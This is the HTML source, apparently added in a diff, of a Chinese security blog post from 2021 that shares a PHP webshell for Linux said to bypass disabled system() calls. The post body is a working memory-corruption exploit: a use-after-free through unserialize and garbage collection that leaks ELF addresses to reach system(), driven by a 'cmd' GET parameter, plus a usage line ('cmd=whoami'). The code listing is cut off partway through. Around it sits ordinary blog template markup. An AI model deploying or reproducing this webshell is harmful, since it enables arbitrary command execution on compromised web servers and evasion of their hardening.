@@ -1,0 +1,497 @@
+
+
+<!DOCTYPE html>
+<html lang="cn" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="然后只要get传入cmd&amp;#x3D;xxx比如cmd&amp;#x3D;whoami然后就能实现了">
+  <meta name="author" content="shadowwolf,oagi,sh3d0ww01f">
+  <meta name="keywords" content="暗网,黑客,极客,渗透测试,专注信息安全,数据泄露,个人隐私保护,网站漏洞研究,sql注入漏洞,xss漏洞,越权访问漏洞,逻辑漏洞,任意文件读取漏洞,漏洞扫描器,远程代码执行,ssrf漏洞,poc编写,cve,exploit,内网渗透,xxe漏洞,qq,反序列化漏洞">
+  
+  <title>分享一个php下，linux下突破system命令限制的马 - shadowwolf的小站</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"oagi.ml","root":"/","version":"1.8.11","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<script charset="utf-8" src="https://cdn.jsdelivr.net/npm/live2d-widget@3.1.4/lib/L2Dwidget.min.js"></script>
+<script>
+    L2Dwidget.init({
+        "model": {
+            jsonPath: "https://cdn.jsdelivr.net/gh/cn-night-ray/live2d-widget-models@1.0/packages/live2d-widget-model-shizuku/assets/shizuku.model.json",
+            scale: 1
+        },
+        "display": {
+            "superSample": 1.2,
+            "width": 200,
+            "height": 380,
+            "position": "right",
+            "hOffset": 0,
+            "vOffset": -32
+        }
+    });
+</script>
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>OAGI</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="分享一个php下，linux下突破system命令限制的马">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-08-01 23:28" pubdate>
+        August 1, 2021 pm
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      751 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      14
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">分享一个php下，linux下突破system命令限制的马</h1>
+            
+            <div class="markdown-body">
+              <p>然后只要get传入<br>cmd&#x3D;xxx<br>比如cmd&#x3D;whoami<br>然后就能实现了</p>
+<span id="more"></span>
+<p>&lt;&gt;</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$cmd</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;cmd&quot;</span>];<br><span class="hljs-title function_ invoke__">pwn</span>(<span class="hljs-variable">$cmd</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">pwn</span>(<span class="hljs-params"><span class="hljs-variable">$cmd</span></span>) </span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$abc</span>, <span class="hljs-variable">$helper</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">str2ptr</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$str</span>, <span class="hljs-variable">$p</span> = <span class="hljs-number">0</span>, <span class="hljs-variable">$s</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>        <span class="hljs-variable">$address</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$j</span> = <span class="hljs-variable">$s</span>-<span class="hljs-number">1</span>; <span class="hljs-variable">$j</span> &gt;= <span class="hljs-number">0</span>; <span class="hljs-variable">$j</span>--) &#123;<br>            <span class="hljs-variable">$address</span> &lt;&lt;= <span class="hljs-number">8</span>;<br>            <span class="hljs-variable">$address</span> |= <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$str</span>[<span class="hljs-variable">$p</span>+<span class="hljs-variable">$j</span>]);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$address</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ptr2str</span>(<span class="hljs-params"><span class="hljs-variable">$ptr</span>, <span class="hljs-variable">$m</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>        <span class="hljs-variable">$out</span> = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$m</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$out</span> .= <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$ptr</span> &amp; <span class="hljs-number">0xff</span>);<br>            <span class="hljs-variable">$ptr</span> &gt;&gt;= <span class="hljs-number">8</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$out</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$str</span>, <span class="hljs-variable">$p</span>, <span class="hljs-variable">$v</span>, <span class="hljs-variable">$n</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>        <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$n</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$str</span>[<span class="hljs-variable">$p</span> + <span class="hljs-variable">$i</span>] = <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$v</span> &amp; <span class="hljs-number">0xff</span>);<br>            <span class="hljs-variable">$v</span> &gt;&gt;= <span class="hljs-number">8</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">leak</span>(<span class="hljs-params"><span class="hljs-variable">$addr</span>, <span class="hljs-variable">$p</span> = <span class="hljs-number">0</span>, <span class="hljs-variable">$s</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$abc</span>, <span class="hljs-variable">$helper</span>;<br>        <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x68</span>, <span class="hljs-variable">$addr</span> + <span class="hljs-variable">$p</span> - <span class="hljs-number">0x10</span>);<br>        <span class="hljs-variable">$leak</span> = <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$helper</span>-&gt;a);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$s</span> != <span class="hljs-number">8</span>) &#123; <span class="hljs-variable">$leak</span> %= <span class="hljs-number">2</span> &lt;&lt; (<span class="hljs-variable">$s</span> * <span class="hljs-number">8</span>) - <span class="hljs-number">1</span>; &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$leak</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">parse_elf</span>(<span class="hljs-params"><span class="hljs-variable">$base</span></span>) </span>&#123;<br>        <span class="hljs-variable">$e_type</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">2</span>);<br>        <span class="hljs-variable">$e_phoff</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x20</span>);<br>        <span class="hljs-variable">$e_phentsize</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">2</span>);<br>        <span class="hljs-variable">$e_phnum</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">2</span>);<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$e_phnum</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$header</span> = <span class="hljs-variable">$base</span> + <span class="hljs-variable">$e_phoff</span> + <span class="hljs-variable">$i</span> * <span class="hljs-variable">$e_phentsize</span>;<br>            <span class="hljs-variable">$p_type</span>  = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$header</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>);<br>            <span class="hljs-variable">$p_flags</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$header</span>, <span class="hljs-number">4</span>, <span class="hljs-number">4</span>);<br>            <span class="hljs-variable">$p_vaddr</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$header</span>, <span class="hljs-number">0x10</span>);<br>            <span class="hljs-variable">$p_memsz</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$header</span>, <span class="hljs-number">0x28</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$p_type</span> == <span class="hljs-number">1</span> &amp;&amp; <span class="hljs-variable">$p_flags</span> == <span class="hljs-number">6</span>) &#123; <span class="hljs-comment"># PT_LOAD, PF_Read_Write</span><br>                <span class="hljs-comment"># handle pie</span><br>                <span class="hljs-variable">$data_addr</span> = <span class="hljs-variable">$e_type</span> == <span class="hljs-number">2</span> ? <span class="hljs-variable">$p_vaddr</span> : <span class="hljs-variable">$base</span> + <span class="hljs-variable">$p_vaddr</span>;<br>                <span class="hljs-variable">$data_size</span> = <span class="hljs-variable">$p_memsz</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$p_type</span> == <span class="hljs-number">1</span> &amp;&amp; <span class="hljs-variable">$p_flags</span> == <span class="hljs-number">5</span>) &#123; <span class="hljs-comment"># PT_LOAD, PF_Read_exec</span><br>                <span class="hljs-variable">$text_size</span> = <span class="hljs-variable">$p_memsz</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$data_addr</span> || !<span class="hljs-variable">$text_size</span> || !<span class="hljs-variable">$data_size</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        <span class="hljs-keyword">return</span> [<span class="hljs-variable">$data_addr</span>, <span class="hljs-variable">$text_size</span>, <span class="hljs-variable">$data_size</span>];<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_basic_funcs</span>(<span class="hljs-params"><span class="hljs-variable">$base</span>, <span class="hljs-variable">$elf</span></span>) </span>&#123;<br>        <span class="hljs-keyword">list</span>(<span class="hljs-variable">$data_addr</span>, <span class="hljs-variable">$text_size</span>, <span class="hljs-variable">$data_size</span>) = <span class="hljs-variable">$elf</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$data_size</span> / <span class="hljs-number">8</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$leak</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$data_addr</span>, <span class="hljs-variable">$i</span> * <span class="hljs-number">8</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &gt; <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &lt; <span class="hljs-variable">$text_size</span>) &#123;<br>                <span class="hljs-variable">$deref</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$leak</span>);<br>                <span class="hljs-comment"># &#x27;constant&#x27; constant check</span><br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$deref</span> != <span class="hljs-number">0x746e6174736e6f63</span>)<br>                    <span class="hljs-keyword">continue</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">continue</span>;<br>            <span class="hljs-variable">$leak</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$data_addr</span>, (<span class="hljs-variable">$i</span> + <span class="hljs-number">4</span>) * <span class="hljs-number">8</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &gt; <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &lt; <span class="hljs-variable">$text_size</span>) &#123;<br>                <span class="hljs-variable">$deref</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$leak</span>);<br>                <span class="hljs-comment"># &#x27;bin2hex&#x27; constant check</span><br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$deref</span> != <span class="hljs-number">0x786568326e6962</span>)<br>                    <span class="hljs-keyword">continue</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">continue</span>;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$data_addr</span> + <span class="hljs-variable">$i</span> * <span class="hljs-number">8</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_binary_base</span>(<span class="hljs-params"><span class="hljs-variable">$binary_leak</span></span>) </span>&#123;<br>        <span class="hljs-variable">$base</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-variable">$start</span> = <span class="hljs-variable">$binary_leak</span> &amp; <span class="hljs-number">0xfffffffffffff000</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">0x1000</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$addr</span> = <span class="hljs-variable">$start</span> - <span class="hljs-number">0x1000</span> * <span class="hljs-variable">$i</span>;<br>            <span class="hljs-variable">$leak</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$addr</span>, <span class="hljs-number">0</span>, <span class="hljs-number">7</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$leak</span> == <span class="hljs-number">0x10102464c457f</span>) &#123; <span class="hljs-comment"># ELF header</span><br>                <span class="hljs-keyword">return</span> <span class="hljs-variable">$addr</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_system</span>(<span class="hljs-params"><span class="hljs-variable">$basic_funcs</span></span>) </span>&#123;<br>        <span class="hljs-variable">$addr</span> = <span class="hljs-variable">$basic_funcs</span>;<br>        <span class="hljs-keyword">do</span> &#123;<br>            <span class="hljs-variable">$f_entry</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$addr</span>);<br>            <span class="hljs-variable">$f_name</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$f_entry</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$f_name</span> == <span class="hljs-number">0x6d6574737973</span>) &#123; <span class="hljs-comment"># system</span><br>                <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$addr</span> + <span class="hljs-number">8</span>);<br>            &#125;<br>            <span class="hljs-variable">$addr</span> += <span class="hljs-number">0x20</span>;<br>        &#125; <span class="hljs-keyword">while</span>(<span class="hljs-variable">$f_entry</span> != <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ryat</span> </span>&#123;<br>        <span class="hljs-keyword">var</span> <span class="hljs-variable">$ryat</span>;<br>        <span class="hljs-keyword">var</span> <span class="hljs-variable">$chtg</span>;<br><br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;chtg = <span class="hljs-variable language_">$this</span>-&gt;ryat;<br>            <span class="hljs-variable language_">$this</span>-&gt;ryat = <span class="hljs-number">1</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Helper</span> </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>, <span class="hljs-variable">$b</span>, <span class="hljs-variable">$c</span>, <span class="hljs-variable">$d</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">stristr</span>(PHP_OS, <span class="hljs-string">&#x27;WIN&#x27;</span>)) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;This PoC is for *nix systems only.&#x27;</span>);<br>    &#125;<br>    <span class="hljs-variable">$n_alloc</span> = <span class="hljs-number">10</span>; <span class="hljs-comment"># increase this value if you get segfaults</span><br>    <span class="hljs-variable">$contiguous</span> = [];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$n_alloc</span>; <span class="hljs-variable">$i</span>++)<br>        <span class="hljs-variable">$contiguous</span>[] = <span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-number">79</span>);<br>    <span class="hljs-variable">$poc</span> = <span class="hljs-string">&#x27;a:4:&#123;i:0;i:1;i:1;a:1:&#123;i:0;O:4:&quot;ryat&quot;:2:&#123;s:4:&quot;ryat&quot;;R:3;s:4:&quot;chtg&quot;;i:2;&#125;&#125;i:1;i:3;i:2;R:5;&#125;&#x27;</span>;<br>    <span class="hljs-variable">$out</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$poc</span>);<br>    <span class="hljs-title function_ invoke__">gc_collect_cycles</span>();<br>    <span class="hljs-variable">$v</span> = [];<br>    <span class="hljs-variable">$v</span>[<span class="hljs-number">0</span>] = <span class="hljs-title function_ invoke__">ptr2str</span>(<span class="hljs-number">0</span>, <span class="hljs-number">79</span>);<br>    <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$v</span>);<br>    <span class="hljs-variable">$abc</span> = <span class="hljs-variable">$out</span>[<span class="hljs-number">2</span>][<span class="hljs-number">0</span>];<br>    <span class="hljs-variable">$helper</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Helper</span>;<br>    <span class="hljs-variable">$helper</span>-&gt;b = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"><span class="hljs-variable">$x</span></span>) </span>&#123; &#125;;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$abc</span>) == <span class="hljs-number">79</span> || <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$abc</span>) == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;UAF failed&quot;</span>);<br>    &#125;<br>    <span class="hljs-comment"># leaks</span><br>    <span class="hljs-variable">$closure_handlers</span> = <span class="hljs-title function_ invoke__">str2ptr</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-variable">$php_heap</span> = <span class="hljs-title function_ invoke__">str2ptr</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x58</span>);<br>    <span class="hljs-variable">$abc_addr</span> = <span class="hljs-variable">$php_heap</span> - <span class="hljs-number">0xc8</span>;<br>    <span class="hljs-comment"># fake value</span><br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">2</span>);<br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">6</span>);<br>    <span class="hljs-comment"># fake reference</span><br>	<span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x10</span>, <span class="hljs-variable">$abc_addr</span> + <span class="hljs-number">0x60</span>);<br>	<span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0xa</span>);<br>    <span class="hljs-variable">$closure_obj</span> = <span class="hljs-title function_ invoke__">str2ptr</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x20</span>);<br>    <span class="hljs-variable">$binary_leak</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$closure_handlers</span>, <span class="hljs-number">8</span>);<br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$base</span> = <span class="hljs-title function_ invoke__">get_binary_base</span>(<span class="hljs-variable">$binary_leak</span>))) &#123;<br>      <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(!(<span 